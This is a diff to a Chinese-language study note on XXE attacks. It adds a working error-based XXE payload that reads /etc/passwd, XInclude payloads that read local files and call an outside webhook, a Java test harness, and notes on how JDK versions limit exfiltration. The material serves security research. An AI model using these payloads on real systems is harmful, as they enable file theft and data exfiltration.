@@ -305,6 +305,15 @@
   <root>&start;&xxe;&end;</root>
   ```
 
+#### http和ftp对于特殊字符的限制
+
+> 所有的【\r】 都会被替换为【\n】
+> 如果含有特殊字符 【%】 【&】 会完全出错。
+> 如果含有特殊字符 【’】 【”】 可以稍微绕过。
+> 如果含有特殊字符 【?】，对 http 无影响，对 ftp 会造成截断。
+> 如果含有特殊字符【/】， 对 http 无影响，对 ftp 需要额外增加解析的 case。
+> 如果含有特殊字符【#】，会造成截断。
+
 #### 后端对某些字符的过滤
 
 * 对%：使用\&#37;替代
@@ -329,10 +338,116 @@
 
 #### 高jdk版本(TODO)
 
-##### O2OA报错回显
+在高jdk版本下，外带文件(http和jdk外带)受到换行符的影响，也就是说无法外带多行文件，以ftp为例：
+
+* <7u141-b00 或 <8u131-b09 ：不会受文件中\n的影响
+* jdk8u131：能创建 FTP 连接，外带文件内容中含有\n则抛出异常
+* jdk8u232：不能创建 FTP 连接，只要 url 中含有\n就会抛出异常
+
+如何得知java版本，在xml解析器请求外部dtd时，一般会会携带jdk的版本。
+
+##### 报错注入
+
+* 目标无法链接外网时，Blind XXE无法进行
+* jdk版本较高时，外带文件内容受限
+
+当目标支持报错回显时，可以采用以下payload实现报错注入：
+
+* 这是P🐂的payload，实验环境是php + libxml 2.8.0。貌似不通用，在java的一些xml解析器下不成功
+
+```xml
+<?xml version="1.0" ?>
+
+<!DOCTYPE message [
+
+    <!ENTITY % NUMBER '
+
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+
+        &#x25;eval;
+
+        &#x25;error;
+
+        '>
+
+    %NUMBER;
+
+]>
+
+<message>any text</message>
+```
+
+* o2oa的实战案例
 
 ### 补充
 
-#### XInclude XXE
+#### XInclude XXE(TODO)
+
+> 某些应用程序接收客户端提交的数据，将其嵌入服务器端的 XML 文档中，然后解析文档。例如，将客户端提交的数据放入后端 SOAP 请求中，然后由后端 SOAP 服务处理该请求。
+>
+> 在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改元素。但是，您或许可以改用。 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档的任何数据值内放置攻击，因此，在您只控制放置在服务器端 XML 文档中的单个数据项的情况下，可以执行攻击。`DOCTYPE``XInclude``XInclude``XInclude`
+>
+> 要执行攻击，您需要引用命名空间并提供要包含的文件的路径。例如：`XInclude``XInclude`
+>
+> ```xml
+> <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+> <xi:include parse="text" href="file:///etc/passwd"/></foo>
+> ```
+
+XInclude标准很多解析器都默认不支持，以dom为例，需要显示设置
+
+```java
+import org.jdom2.JDOMException;
+import org.w3c.dom.Element;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+import org.xml.sax.SAXException;
+
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
+import java.io.File;
+import java.io.IOException;
+
+public class XincludeXXE {
+    public static void main(String[] args) throws IOException, JDOMException, ParserConfigurationException, SAXException {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+        factory.setNamespaceAware(true);
+        factory.setXIncludeAware(true); // 启用XInclude支持
+
+        // 创建DocumentBuilder实例
+        DocumentBuilder builder = factory.newDocumentBuilder();
+        org.w3c.dom.Document doc = builder.parse(new File("D:\\l11267\\java\\program\\JavaTest\\XXETest\\src\\main\\resources\\0.xml"));
+        Element root = doc.getDocumentElement();
+        NodeList nodes = root.getChildNodes();
+        for (int i = 0; i < nodes.getLength(); i++) {
+            Node node = nodes.item(i);
+            System.out.println(node.getNodeName()+node.getTextContent());
+        }
+
+    }
+}
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///d:/test.txt"/>
+    <xi:include parse="text" href="https://webhook.uutool.cn/4pt2j105b8e0?xi"/>
+</foo>
+</root>
+```
+
+
+
+* 防御方式是否和外部dtd相同？
+  * 不同，但是一般默认关闭
+
+* 是否支持外带文件？
+  * 一般不支持，因为无法像dtd中一样定义参数实体。但是一些XML预处理工具和XML Schema可能会提供一个外带的环境，这很依赖目标环境
+* 是否支持报错回显文件？
 
 #### 疑难杂症
